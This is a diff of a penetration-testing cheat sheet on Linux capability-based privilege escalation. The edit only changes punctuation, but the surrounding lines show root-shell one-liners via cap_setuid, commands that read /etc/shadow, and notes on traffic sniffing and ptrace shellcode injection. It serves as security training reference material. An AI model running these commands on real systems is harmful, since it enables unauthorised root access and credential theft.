@@ -1,7 +1,7 @@
 # Linux Capabilities, LD_PRELOAD & PATH Hijacking
 
 !!! tip ""
-    Run `getcap -r / 2>/dev/null` and check `sudo -l` for `env_keep+=LD_PRELOAD` early in enumeration — these are frequently misconfigured and give root without touching SUID binaries or cron jobs.
+    Run `getcap -r / 2>/dev/null` and check `sudo -l` for `env_keep+=LD_PRELOAD` early in enumeration, these are frequently misconfigured and give root without touching SUID binaries or cron jobs.
 
 ---
 
@@ -13,7 +13,7 @@ Capabilities grant specific elevated privileges to individual binaries without m
 getcap -r / 2>/dev/null
 ```
 
-### `cap_setuid` — set arbitrary UID (root)
+### `cap_setuid`: set arbitrary UID (root)
 
 ```bash
 # Python
@@ -26,7 +26,7 @@ perl -e 'use POSIX (setuid); setuid(0); exec "/bin/bash";'
 node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
 ```
 
-### `cap_dac_read_search` — read any file regardless of permissions
+### `cap_dac_read_search`: read any file regardless of permissions
 
 ```bash
 # Read /etc/shadow directly if a tool has this capability
@@ -36,11 +36,11 @@ python3 -c 'print(open("/etc/shadow").read())'
 tar -cvf /dev/null /etc/shadow 2>/dev/null | tar -xvf - -O
 ```
 
-### `cap_net_raw` — raw socket access
+### `cap_net_raw`: raw socket access
 
 A binary with this capability can sniff network traffic. Useful for credential capture on shared network segments.
 
-### `cap_sys_ptrace` — attach to any process
+### `cap_sys_ptrace`: attach to any process
 
 Can be used to inject shellcode into a root-owned process:
 
@@ -49,7 +49,7 @@ gdb -p <root-process-pid>
 ```
 
 !!! tip ""
-    GTFOBins has a Capabilities section for common binaries — check there before writing custom exploit code.
+    GTFOBins has a Capabilities section for common binaries. Check there before writing custom exploit code.
 
 ---
 
